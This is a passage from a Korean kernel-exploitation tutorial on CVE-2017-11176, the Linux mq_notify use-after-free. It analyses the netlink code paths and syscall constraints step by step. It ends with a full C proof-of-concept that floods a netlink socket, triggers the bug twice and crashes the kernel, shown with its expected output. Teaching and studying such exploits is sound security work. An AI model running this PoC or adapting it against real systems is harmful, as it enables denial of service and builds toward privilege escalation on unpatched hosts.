소켓 생성 중엔 소켓의 pid가 0이기 때문에(구조체 전체가 sk\_alloc()에 의해 0이 됨) [0]에서의 검사는 제어할 수 없다. 나중에 다시 돌아올 것이지만 지금은 **netlink\_autobind()** [1]가 우리의 송신자 소켓에 "사용 가능한" pid를 찾아줘서 실패하지 않는다고 생각하자. 그러나 sendmsg()를 두 번째로 호출할 땐 검사가 생략되고 "nlk->pid"가 설정될 것이다. 다음 내용을 보자:

```c
      err = -EMSGSIZE;
[0]   if (len > sk->sk_sndbuf - 32)
        goto out;
      err = -ENOBUFS;
      skb = alloc_skb(len, GFP_KERNEL);
[1]   if (skb == NULL)
        goto out;
```

여기서 "lent"은 **\_\_sys\_sendmsg()** 도중에 계산된다. 이는 "모든 iovec len의 합"이다. 그러므로 모든 iovec의 합이 sk->sk\_sndbuf 빼기 32보다 작아야 한다. iovec을 하나만 사용하여 간단하게 처리해보자. 즉 다음과 같다:

* **msg->msg\_iovlen이 1과 같다** // iovec 하나
* **msg->msg\_iov->iov\_len이 sk->sk\_sndbuf - 32보다 작거나 같다**
* **msg->msg->msg\_iov->iov\_base가 유저 영역에서 읽을 수 있어야 한다** //그렇지 않으면 \_\_sys\_sendmsg()가 실패한다

마지막 제약은 **msg->msg\_iov 또한 *유저 영역의* 읽을 수 있는 주소**라는 것을 나타낸다(다시 말하지만 그렇지 않으면 \_\_sys\_sendmsg()가 실패함).

**노트**: "sk\_sndbuf"는 "sk\_rcvbuf"와 동일하지만 sending buffer에 대해서는 아니다. 우린 이 값을 **sock\_getsockopt()**에 "SO\_SNDBUF" 옵션으로 얻을 수 있다.

[1]에서의 검사는 실패하면 안 된다. 만약 실패한다면 커널이 현재 메모리가 부족하여 익스플로잇을 하기 좋은 상태가 아니라는 것이다. 그럼 익스플로잇을 진행할 수 없고, 운이 나쁘면 커널 크래시가 날 것이다! **경고했다. 에러 처리 코드를 구현하라.**

다음 코드는 (통과해야 할 검사가 없어서) 무시해도 된다. "siocb->scm" 구조체가 scm\_send()를 통해 일찍 초기화된다:

```c
      NETLINK_CB(skb).pid   = nlk->pid;
      NETLINK_CB(skb).dst_group = dst_group;
      memcpy(NETLINK_CREDS(skb), &siocb->scm->creds, sizeof(struct ucred));
      NETLINK_CB(skb).flags = netlink_skb_flags;
```

다음 내용을 보자:

```c
      err = -EFAULT;
[0]   if (memcpy_fromiovec(skb_put(skb, len), msg->msg_iov, len)) {
        kfree_skb(skb);
        goto out;
      }
```

다시, *읽을 수 있는* iovec을 제공했다면 [0]의 검사에선 문제가 생기지 않고, 그러지 않았다면 \_\_sys\_sendmsg()가 실패한다 (이전의 제약 참고).

```c
[0]   err = security_netlink_send(sk, skb);
      if (err) {
        kfree_skb(skb);
        goto out;
      }
```

이것은 리눅스 보안 모듈(LSM, 예를 들면 SELinux) 검사이다. 이 검사를 통과하지 못하면 netlink\_unicast에 도달할 다른 방법 혹은 더 일반적으로(generally) "sk\_rmem\_alloc"을 증가시킬 방법을 찾아야 한다(힌트: netlink\_dump()를 시도해보기). 여기선 검사를 통과했다고 가정하자.

그리고 마지막이다:

```c
[0]   if (dst_group) {
        atomic_inc(&skb->users);
        netlink_broadcast(sk, skb, dst_pid, dst_group, GFP_KERNEL);
      }
[1]   err = netlink_unicast(sk, skb, dst_pid, msg->msg_flags&MSG_DONTWAIT);
```

우리는 "dst\_group" 값을 "msg->msg\_name->dst\_group"으로 선택했었다. 0이 되도록 하였으므로 [0]의 검사를 통과할 것이고...**결국 netlink\_unicast()를 호출한다!**

*휴...~~너넨 이런거 하지 마라...~~여기까지 오래 걸렸다...*

좋다. 이제 netlink\_sendmsg()로부터 netlink\_unicast()에 도달하는 데 필요한 모든 요구 조건을 요약해보자:

* **msg->msg\_flags**는 *MSG\_OOB* 플래그가 없다
* **msg->msg\_controllen**은 0이다
* **msg->msg\_namelen**은 0이 아니다
* **msg->msg\_name0>nl\_family**가 AF\_NETLINK와 같다
* **msg->msg\_name->nl\_groups**가 0이다
* **msg->msg\_name->nl\_pid**가 0이 아니고 수신자 소켓을 가리키고 있다
* 송신자 netlink 소켓이 **NETLINK\_USERSOCK** 프로토콜을 사용해야 한다
* **msg->msg\_iovlen**이 1이다
* **msg->msg\_iov**가 읽기 가능한 유저 영역의 주소이다
* **msg->msg\_iov->iov\_len**이 sk\_sndbuf 빼기 32보다 작거나 같다
* **msg->msg\_iov->iov\_base**가 읽기 가능한 유저 영역의 주소이다

여기서 커널 익스플로잇을 할 때의 의무를 알 수 있다. 각각의 검사를 분석, 특정 커널 경로 강제, syscall 파라미터 맞추기(tailor) 등. 작성하기에 너무 긴 목록도 아니다. 몇 몇 경로들은 이보다 훨씬 복잡하다.

이제 넘어가서 netlink\_attachskb()에 도달해보자.

## Reach netlink\_attachskb() from netlink\_unicast()

이번 내용은 이전 것보다 쉽다. netlink\_unicast()는 다음 파라미터를 통해 호출된다:

```c
netlink_unicast(sk, skb, dst_pid, msg->msg_flags&MSG_DONTWAIT);
```

각각의 파라미터의 의미는 다음과 같다:

* **sk**는 우리의 송신자 netlink\_sock이다
* **skb**는 소켓 버퍼인데 *msg->msg\_iov->iov\_len* 크기의 *msg->msg\_iov->iov\_base* 데이터로 가득 차있다.
* **dst\_pid**는 우리의 수신자 netlink 소켓을 가리키는 제어된 pid(*msg->msg\_name->nl\_pid*)이다.
* **msg->msg\_flasg&MSG\_DONTWAIT**은 netlink\_unicast가 block여부를 나타낸다.

**주의**: netlink\_unicast() 코드의 **"ssk"는 송신자 소켓이고 "sk"는 수신자 소켓이다**.

netlink\_unicst() 코드는 다음과 같다:

```c
    int netlink_unicast(struct sock *ssk, struct sk_buff *skb,
            u32 pid, int nonblock)
    {
      struct sock *sk;
      int err;
      long timeo;

      skb = netlink_trim(skb, gfp_any());   // <----- ignore this

[0]   timeo = sock_sndtimeo(ssk, nonblock);
    retry:
[1]   sk = netlink_getsockbypid(ssk, pid);
      if (IS_ERR(sk)) {
        kfree_skb(skb);
        return PTR_ERR(sk);
      }
[2]   if (netlink_is_kernel(sk))
        return netlink_unicast_kernel(sk, skb, ssk);

[3]   if (sk_filter(sk, skb)) {
        err = skb->len;
        kfree_skb(skb);
        sock_put(sk);
        return err;
      }

[4]   err = netlink_attachskb(sk, skb, &timeo, ssk);
      if (err == 1)
        goto retry;
      if (err)
        return err;

[5]   return netlink_sendskb(sk, skb);
    }
```

[0]에서 sock\_sndtimeo()가 **timeo** (timeout)의 값을 *nonblock* 파라미터에 따라 설정한다. 우린 block을 원하지 않기 때문에(nonblock >0), timeo는 0이 될 것이다. 즉 **msg->msg\_flags는 MSG\_DONTWAIT 플래그를 설정해야 한다**.

[1]에서 목적지 netlink\_sock "sk"가 pid를 통해 얻어진다. 다음 섹션에서 보게 되겠지만 **목적지 netlink\_socket**은 netlink\_getsockbypid()에 의해 얻어지기 전에 **bound되어야 한다**.

[2]에서 목적지 소켓이 "커널" 소켓이면 안 된다. netlink 소켓은 *NETLINK\_KERNEL\_SOCKET* 플래그가 있으면 *kernel* 소켓으로 취급(tag)된다. 이는 소켓이 netlink\_kernel\_create() 함수를 통해 생성되었다는 의미이다. 안타깝게도 (현재 익스플로잇의) *NETLINK\_GENERIC* 또한 그 중 하나다. 그럼 이제 **수신자 소켓의 프로토콜도 NETLINK\_USERSOCK으로 바꿔보자**. 어찌 됐든 더 의미가 있긴 하다(?). 수신자 netlink\_sock에 참조가 이루어진다는 걸 기억하자.

[3]에서 BPF sock filter가 적용되어 있을 것이다. **수신자 sock에 아무런 BPF filter도 생성하지 않으면** 통과된다.

그리고 [4]에서 netlink\_attachskb()를 호출한다! netlink\_attachskb() 안에서, 다음 두 경로 중 하나로 가게 된다(코드를 다시 첨부하진 않겠다):

1. 수신자 버퍼가 꽉 차있지 않음: skb\_set\_owner\_r()을 호출하여 sk\_rmem\_alloc을 증가시킨다
2. 수신자 버퍼가 꽉 차있음: netlink\_attachskb()가 block하지 않고 -EAGAIN을 반환한다(?) (timeout is zero)

**즉, 우리는 언제 수신자 버퍼가 꽉 차있는지 알 방법이 생겼다. 그냥 sendmsg()의 에러 코드를 확인하면 된다.**

마지막으로, [5]의 netlink\_sendskb() 호출은 skb를 수신자 버퍼 리스트에 붙이고 netlink\_getsockbypid()가 했던 참조를 해제한다. 야호!😊

제약 리스트를 갱신해보자:

* **msg->msg\_flags**의 MSG\_DONTWAIT 플래그가 설정됨
* 수신자 netlink 소켓이 sendmsg() 호출 전에 bind되어야 함
* 수신자 netlnk 소켓이 무조건 **NETLINK\_USERSOCK** 프로토콜을 상뇽해야 함
* 수신자 소켓에 어떤 BPF filter도 정의하면 안 됨

이제 최종 PoC 코드에 거의 다 왔다. 수신자 소켓을 bind하기만 하면 된다.

## Binding the receiver socket

다른 어떤 소켓 통신과 마찬가지로 두 소켓은 "주소"를 이용하여 통신할 수 있다. netlink 소켓에서는 "struct sockaadr\_nl" 타입을 사용한다(매뉴얼 참고):

```c
struct sockaddr_nl {
   sa_family_t     nl_family;  /* AF_NETLINK */
   unsigned short  nl_pad;     /* Zero. */
   pid_t           nl_pid;     /* Port ID. */
   __u32           nl_groups;  /* Multicast groups mask. */
};
```

"broadcast group"에 속하고 싶지 않으므로, *nl\_groups*가 0이어야 한다. 여기서 중요한 유일한 필드는 "nl\_pid"이다.

기본적으로 **netlink\_bind()**는 두 경로로 갈 수 있다:

1. nl\_pid가 0이 아닌 경우: **netlink\_insert()**를 호출
2. nl\_pid가 0인 경우: **netlink\_autobind()**를 호출하여 결국 netlink\_insert() 호출

이미 사용된 *pid*를 통해 netlink\_insert()를 호출하면 "-EADDRINUSE" 에러가 발생하며 실패한다. 그렇지 않으면 *nl\_pid*와 netlink sock 사이의 매핑이 생긴다. 즉 netlink\_getsockbypid()를 통해 netlink\_sock을 얻을 수 있다. 게다가, **netlink\_insert()는 sock의 레퍼런스 카운터를 1 증가시킨다**. 최종 proof-of-concept 코드를 위해 기억해두자.

**노트**: netlink가 "pid:netlink\_sock" 매핑을 저장하는 방법은 [part 4](https://chamalane.herokuapp.com/posts/5d50360ac040080004228198)에서 더 깊게 다룰 것이다.

netlink\_autobind()를 호출하는 것이 더 자연스러워 보이지만 우린 유저 영역에서 bind()가 성공할 때까지 pid 값을 브루트포싱하는 *시뮬레이션*을 한다. 그렇게 하면 getsockname()을 호출하지 않고도 목적지 nl\_pid 값을 가질 수 있고, (아마도) 디버깅이 더 쉬워진다(확실하진 않다🙄).

## Putting it All Together

이 모든 경로를 지나오기까지 오래 걸렸다. 이제 익스플로잇을 구현하고 우리의 첫 목표: **netlink\_attachskb()가 1을 반환하게 만들기**에 도달할 준비가 되었다!

전략은 다음과 같다:

1. NETLINK\_USERSOCK 프로토콜을 사용하는 AF\_NETLINK 소켓을 둘 생성한다.
2. 타겟(수신자) 소켓을 bind한다(= receiver buffer가 가득 차있어야 함).
3. [선택] 타겟 소켓의 receive buffer를 줄여본다 (sendmsg()를 덜 호출해도 됨).
4. 송신자 소켓에서 타겟 소켓에 *sendmsg()*를 계속 보내서 EAGAIN을 반환하게 한다.
5. 송신자 소켓을 끈다(close). (더이상 필요 없음)

모든 것이 잘 돌아가는지 검증하기 위해 다음 *독립된*(standalone) 코드를 돌려볼 수 있다:

```c
static int prepare_blocking_socket(void)
{
  int send_fd;
  int recv_fd;
  char buf[1024*10]; // should be less than (sk->sk_sndbuf - 32), you can use getsockopt()
  int new_size = 0; // this will be reset to SOCK_MIN_RCVBUF

  struct sockaddr_nl addr = {
    .nl_family = AF_NETLINK,
    .nl_pad = 0,
    .nl_pid = 118, // must different than zero
    .nl_groups = 0 // no groups
  };

  struct iovec iov = {
    .iov_base = buf,
    .iov_len = sizeof(buf)
  };

  struct msghdr mhdr = {
    .msg_name = &addr,
    .msg_namelen = sizeof(addr),
    .msg_iov = &iov,
    .msg_iovlen = 1,
    .msg_control = NULL,
    .msg_controllen = 0,
    .msg_flags = 0, 
  };

  printf("[ ] preparing blocking netlink socket\n");

  if ((send_fd = _socket(AF_NETLINK, SOCK_DGRAM, NETLINK_USERSOCK)) < 0 ||
      (recv_fd = _socket(AF_NETLINK, SOCK_DGRAM, NETLINK_USERSOCK)) < 0)
  {
    perror("socket");
    goto fail;
  }
  printf("[+] socket created (send_fd = %d, recv_fd = %d)\n", send_fd, recv_fd);

  // simulate netlink_autobind()
  while (_bind(recv_fd, (struct sockaddr*)&addr, sizeof(addr)))
  {
    if (errno != EADDRINUSE)
    {
      perror("[-] bind");
      goto fail;
    }
    addr.nl_pid++;
  }

  printf("[+] netlink socket bound (nl_pid=%d)\n", addr.nl_pid);

  if (_setsockopt(recv_fd, SOL_SOCKET, SO_RCVBUF, &new_size, sizeof(new_size)))
    perror("[-] setsockopt"); // no worry if it fails, it is just an optim.
  else
    printf("[+] receive buffer reduced\n");

  printf("[ ] flooding socket\n");
  while (_sendmsg(send_fd, &mhdr, MSG_DONTWAIT) > 0)  // <----- don't forget MSG_DONTWAIT
    ;
  if (errno != EAGAIN)  // <----- did we failed because the receive buffer is full ?
  {
    perror("[-] sendmsg");
    goto fail;
  }
  printf("[+] flood completed\n");

  _close(send_fd);

  printf("[+] blocking socket ready\n");
  return recv_fd;

fail:
  printf("[-] failed to prepare block socket\n");
  return -1;
}
```

결과를 system tap으로 확인해보자. **여기서부터 system tap은 커널을 관찰하는 데만 쓰인다. 커널 수정에 이용하지 않는다.** socket을 *congested*로 마킹했던 부분을 지우는 것을 잊지 말자. 이제 구동해보자:

```plaintext
(2768-2768) [SYSCALL] ==>> sendmsg (3, 0x7ffe69f94b50, MSG_DONTWAIT)
(2768-2768) [uland] ==>> copy_from_user ()
(2768-2768) [uland] ==>> copy_from_user ()
(2768-2768) [uland] ==>> copy_from_user ()
(2768-2768) [netlink] ==>> netlink_sendmsg (kiocb=0xffff880006137bb8 sock=0xffff88002fdba0c0 msg=0xffff880006137f18 len=0x2800)
(socket=0xffff88002fdba0c0)->sk->sk_refcnt = 1
(2768-2768) [netlink] ==>> netlink_autobind (sock=0xffff88002fdba0c0)
(2768-2768) [netlink] <<== netlink_autobind = 0
(2768-2768) [skb] ==>> alloc_skb (priority=0xd0 size=?)
(2768-2768) [skb] ==>> skb_put (skb=0xffff88003d298840 len=0x2800)
(2768-2768) [skb] <<== skb_put = ffff880006150000
(2768-2768) [iovec] ==>> memcpy_fromiovec (kdata=0xffff880006150000 iov=0xffff880006137da8 len=0x2800)
(2768-2768) [uland] ==>> copy_from_user ()
(2768-2768) [iovec] <<== memcpy_fromiovec = 0
(2768-2768) [netlink] ==>> netlink_unicast (ssk=0xffff880006173c00 skb=0xffff88003d298840 pid=0x76 nonblock=0x40)
(2768-2768) [netlink] ==>> netlink_lookup (pid=? protocol=? net=?)
(2768-2768) [sk] ==>> sk_filter (sk=0xffff88002f89ac00 skb=0xffff88003d298840)
(2768-2768) [sk] <<== sk_filter = 0
(2768-2768) [netlink] ==>> netlink_attachskb (sk=0xffff88002f89ac00 skb=0xffff88003d298840 timeo=0xffff880006137ae0 ssk=0xffff880006173c00)
-={ dump_netlink_sock: 0xffff88002f89ac00 }=-
- sk = 0xffff88002f89ac00
- sk->sk_rmem_alloc = 0                               // <-----
- sk->sk_rcvbuf = 2312                                // <-----
- sk->sk_refcnt = 3
- nlk->state = 0
- sk->sk_flags = 100
-={ dump_netlink_sock: END}=-
(2768-2768) [netlink] <<== netlink_attachskb = 0
-={ dump_netlink_sock: 0xffff88002f89ac00 }=-
- sk = 0xffff88002f89ac00
- sk->sk_rmem_alloc = 10504                           // <-----
- sk->sk_rcvbuf = 2312                                // <-----
- sk->sk_refcnt = 3
- nlk->state = 0
- sk->sk_flags = 100
-={ dump_netlink_sock: END}=-
(2768-2768) [netlink] <<== netlink_unicast = 2800
(2768-2768) [netlink] <<== netlink_sendmsg = 2800
(2768-2768) [SYSCALL] <<== sendmsg= 10240
```

**훌륭하다! 이제 "receive buffer full" 조건을 만족시켰다(*sk\_rmem\_alloc > sk\_rcvbuf*). 즉 *mq\_attachskb()*에 대한 다음 호출이 1을 반환할 것이다!**

할 일 목록을 갱신해보자:

1. [해결] netlink\_attachskb()가 1을 반환하게 만들기
2. [해결] 익스플로잇 스레드 unblock하기
3. [해결] 두 번째 fget() 호출이 NULL을 반환하게 만들기

거의 다 끝났다.

- - -

# <a name='final-poc-code'></a>Final Proof-Of-Concept Code

마지막 세 섹션에서 *유저 영역 코드*만을 이용하여 버그를 트리거하는데 필요한 모든 조건을 구현했다. 최종 *proof-of-concept* 코드를 보기 전에 **한 가지 더 해야 할 일**이 있다.

receive buffer를 채울 때 netlink\_bind() 도중 netlink\_insert()에 의하여 레퍼런스 카운터가 하나 증가하는 것을 보았다. 이는 *mq\_notify()*에 들어가기 *전에* 레퍼런스 카운터가 (1이 아닌) 2가 된다는 뜻이다.

버그가 netlink\_sock의 레퍼런스 카운터를 1 감소시키는 *primitive*를 줬으므로 **버그를 두 번 트리거해야 한다**!

버그를 트리거하기 전에 메인 스레드를 unblock하려고 *dup()*를 사용했었다. 그것을 다시 사용해서 한 fd는 unblock에 다른 fd는 버그를 트리거하는데 사용할 것이다(?).

**"*알겠으니까 코드를 보여줘!*"**

다음 코드가 최종 PoC 코드다(system tap을 구동하지 말 것):

```c
/*
 * CVE-2017-11176 Proof-of-concept code by LEXFO.
 *
 * Compile with:
 *
 *  gcc -fpic -O0 -std=c99 -Wall -pthread exploit.c -o exploit
 */

#define _GNU_SOURCE
#include <asm/types.h>
#include <mqueue.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <linux/netlink.h>
#include <pthread.h>
#include <errno.h>
#include <stdbool.h>

// ============================================================================
// ----------------------------------------------------------------------------
// ============================================================================

#define NOTIFY_COOKIE_LEN (32)
#define SOL_NETLINK (270) // from [include/linux/socket.h]

// ----------------------------------------------------------------------------

// avoid library wrappers
#define _mq_notify(mqdes, sevp) syscall(__NR_mq_notify, mqdes, sevp)
#define _socket(domain, type, protocol) syscall(__NR_socket, domain, type, protocol)
#define _setsockopt(sockfd, level, optname, optval, optlen) \
  syscall(__NR_setsockopt, sockfd, level, optname, optval, optlen)
#define _getsockopt(sockfd, level, optname, optval, optlen) \
  syscall(__NR_getsockopt, sockfd, level, optname, optval, optlen)
#define _dup(oldfd) syscall(__NR_dup, oldfd)
#define _close(fd) syscall(__NR_close, fd)
#define _sendmsg(sockfd, msg, flags) syscall(__NR_sendmsg, sockfd, msg, flags)
#define _bind(sockfd, addr, addrlen) syscall(__NR_bind, sockfd, addr, addrlen)

// ----------------------------------------------------------------------------

#define PRESS_KEY() \
  do { printf("[ ] press key to continue...\n"); getchar(); } while(0)

// ============================================================================
// ----------------------------------------------------------------------------
// ============================================================================

struct unblock_thread_arg
{
  int sock_fd;
  int unblock_fd;
  bool is_ready; // we can use pthread barrier instead
};

// ----------------------------------------------------------------------------

static void* unblock_thread(void *arg)
{
  struct unblock_thread_arg *uta = (struct unblock_thread_arg*) arg;
  int val = 3535; // need to be different than zero

  // notify the main thread that the unblock thread has been created. It *must*
  // directly call mq_notify().
  uta->is_ready = true; 

  sleep(5); // gives some time for the main thread to block

  printf("[ ][unblock] closing %d fd\n", uta->sock_fd);
  _close(uta->sock_fd);

  printf("[ ][unblock] unblocking now\n");
  if (_setsockopt(uta->unblock_fd, SOL_NETLINK, NETLINK_NO_ENOBUFS, &val, sizeof(val)))
    perror("[+] setsockopt");
  return NULL;
}

// ----------------------------------------------------------------------------

static int decrease_sock_refcounter(int sock_fd, int unblock_fd)
{
  pthread_t tid;
  struct sigevent sigev;
  struct unblock_thread_arg uta;
  char sival_buffer[NOTIFY_COOKIE_LEN];

  // initialize the unblock thread arguments
  uta.sock_fd = sock_fd;
  uta.unblock_fd = unblock_fd;
  uta.is_ready = false;

  // initialize the sigevent structure
  memset(&sigev, 0, sizeof(sigev));
  sigev.sigev_notify = SIGEV_THREAD;
  sigev.sigev_value.sival_ptr = sival_buffer;
  sigev.sigev_signo = uta.sock_fd;

  printf("[ ] creating unblock thread...\n");
  if ((errno = pthread_create(&tid, NULL, unblock_thread, &uta)) != 0)
  {
    perror("[-] pthread_create");
    goto fail;
  }
  while (uta.is_ready == false) // spinlock until thread is created
    ;
  printf("[+] unblocking thread has been created!\n");

  printf("[ ] get ready to block\n");
  if ((_mq_notify((mqd_t)-1, &sigev) != -1) || (errno != EBADF))
  {
    perror("[-] mq_notify");
    goto fail;
  }
  printf("[+] mq_notify succeed\n");

  return 0;

fail:
  return -1;
}

// ============================================================================
// ----------------------------------------------------------------------------
// ============================================================================

/*
 * Creates a netlink socket and fills its receive buffer.
 *
 * Returns the socket file descriptor or -1 on error.
 */

static int prepare_blocking_socket(void)
{
  int send_fd;
  int recv_fd;
  char buf[1024*10];
  int new_size = 0; // this will be reset to SOCK_MIN_RCVBUF

  struct sockaddr_nl addr = {
    .nl_family = AF_NETLINK,
    .nl_pad = 0,
    .nl_pid = 118, // must different than zero
    .nl_groups = 0 // no groups
  };

  struct iovec iov = {
    .iov_base = buf,
    .iov_len = sizeof(buf)
  };

  struct msghdr mhdr = {
    .msg_name = &addr,
    .msg_namelen = sizeof(addr),
    .msg_iov = &iov,
    .msg_iovlen = 1,
    .msg_control = NULL,
    .msg_controllen = 0,
    .msg_flags = 0, 
  };

  printf("[ ] preparing blocking netlink socket\n");

  if ((send_fd = _socket(AF_NETLINK, SOCK_DGRAM, NETLINK_USERSOCK)) < 0 ||
      (recv_fd = _socket(AF_NETLINK, SOCK_DGRAM, NETLINK_USERSOCK)) < 0)
  {
    perror("socket");
    goto fail;
  }
  printf("[+] socket created (send_fd = %d, recv_fd = %d)\n", send_fd, recv_fd);

  while (_bind(recv_fd, (struct sockaddr*)&addr, sizeof(addr)))
  {
    if (errno != EADDRINUSE)
    {
      perror("[-] bind");
      goto fail;
    }
    addr.nl_pid++;
  }

  printf("[+] netlink socket bound (nl_pid=%d)\n", addr.nl_pid);

  if (_setsockopt(recv_fd, SOL_SOCKET, SO_RCVBUF, &new_size, sizeof(new_size)))
    perror("[-] setsockopt"); // no worry if it fails, it is just an optim.
  else
    printf("[+] receive buffer reduced\n");

  printf("[ ] flooding socket\n");
  while (_sendmsg(send_fd, &mhdr, MSG_DONTWAIT) > 0)
    ;
  if (errno != EAGAIN)
  {
    perror("[-] sendmsg");
    goto fail;
  }
  printf("[+] flood completed\n");

  _close(send_fd);

  printf("[+] blocking socket ready\n");
  return recv_fd;

fail:
  printf("[-] failed to prepare block socket\n");
  return -1;
}

// ============================================================================
// ----------------------------------------------------------------------------
// ============================================================================

int main(void)
{
  int sock_fd  = -1;
  int sock_fd2 = -1;
  int unblock_fd = 1;

  printf("[ ] -={ CVE-2017-11176 Exploit }=-\n");

  if ((sock_fd = prepare_blocking_socket()) < 0)
    goto fail;
  printf("[+] netlink socket created = %d\n", sock_fd);

  if (((unblock_fd = _dup(sock_fd)) < 0) || ((sock_fd2 = _dup(sock_fd)) < 0))
  {
    perror("[-] dup");
    goto fail;
  }
  printf("[+] netlink fd duplicated (unblock_fd=%d, sock_fd2=%d)\n", unblock_fd, sock_fd2);

  // trigger the bug twice
  if (decrease_sock_refcounter(sock_fd, unblock_fd) ||
      decrease_sock_refcounter(sock_fd2, unblock_fd))
  {
    goto fail;
  }

  printf("[ ] ready to crash?\n");
  PRESS_KEY();

  // TODO: exploit

  return 0;

fail:
  printf("[-] exploit failed!\n");
  PRESS_KEY();
  return -1;
}

// ============================================================================
// ----------------------------------------------------------------------------
// ============================================================================
```

다음은 예상되는 결과이다:

```plaintext
[ ] -={ CVE-2017-11176 Exploit }=-
[ ] preparing blocking netlink socket
[+] socket created (send_fd = 3, recv_fd = 4)
[+] netlink socket bound (nl_pid=118)
[+] receive buffer reduced
[ ] flooding socket
[+] flood completed
[+] blocking socket ready
[+] netlink socket created = 4
[+] netlink fd duplicated (unblock_fd=3, sock_fd2=5)
[ ] creating unblock thread...
[+] unblocking thread has been created!
[ ] get ready to block
[ ][unblock] closing 4 fd
[ ][unblock] unblocking now
[+] mq_notify succeed
[ ] creating unblock thread...
[+] unblocking thread has been created!
[ ] get ready to block
[ ][unblock] closing 5 fd
[ ][unblock] unblocking now
[+] mq_notify succeed
[ ] ready to crash?
[ ] press key to continue...

<<< KERNEL CRASH HERE >>>
```

이제부터는, 익스플로잇이 완벽해질 때(= 커널이 보수되었을 때)까지 익스플로잇을 실행하기만 하면 **계속 시스템에 크래시가 날** 것이다. 짜증나지만 익숙해져야 한다. 불필요한 서비스(그래픽 관련 등)를 제거하여 부팅 시간을 줄일 수도 있다. "진짜" 타겟에 맞추려면 그것들을 다시 활성화시켜야 한다는 점을 기억하자. 그런 것들이 실제로 커널에 영향을 준다.

- - -

# <a name='conclusion'></a>결론

이번 파트에선 스케쥴러 하위 시스템, task 상태 그리고 running/waiting 상태 전환이 어떻게 이뤄지는지를 wait queue를 이용하여 소개했다. 이를 통해 메인 스레드를 깨우고 race condition에서 이길(win) 수 있었다.

close()와 dup() syscall을 이용한 방법으로 fget()의 두 번째 호출이 NULL을 반환하게 했다. 마지막으로 netlink\_attachskb()에서 "retry path"에 진입하는 여러 방법을 연구하여 netlink\_attachskb()가 1을 반환하도록 만들었다.

이 모든 것을 이용하여 System Tap 없이 버그를 확실하게 트리거하고 커널 크래시를 일으키는 (유저 영역의 코드만 이용한) proof-of-concept 코드를 만들었다.

[다음 파트](https://chamalane.herokuapp.com/posts/5d503601c040080004228197)에선 use-after-free 익스플로잇이라는 중요한 주제를 다룬다. slab allocator, type confusion, 재할당 그리고 *arbitrary call primitive*를 얻기 위해 그것을 어떻게 사용하는지에 대한 기본적인 내용을 설명할 것이다. 익스플로잇 빌드와 디버깅에 사용될 새 툴들도 볼 수 있을 것이다. 마지막엔 *우리가 원하는* 커널 패닉을 일으킬 것이다.
